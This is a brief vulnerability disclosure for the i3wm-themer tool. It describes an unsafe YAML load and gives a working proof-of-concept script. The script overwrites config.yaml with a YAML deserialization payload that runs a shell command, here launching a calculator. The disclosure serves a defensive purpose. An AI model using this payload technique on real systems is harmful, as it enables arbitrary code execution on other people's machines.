# Description

`i3wm-themer` is the theme collection manager for i3-wm  which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
git clone https://github.com/unix121/i3wm-themer
cd i3wm-themer/
sudo pip install -r requirements.txt
```

### Run exploit.py
```
import os
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
os.system('git clone https://github.com/unix121/i3wm-themer')
os.chdir('i3wm-themer/')
os.system('rm config.yaml')
open('config.yaml','w+').write(payload)
os.system('python3 i3wm-themer.py --config config.yaml --install defaults/')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
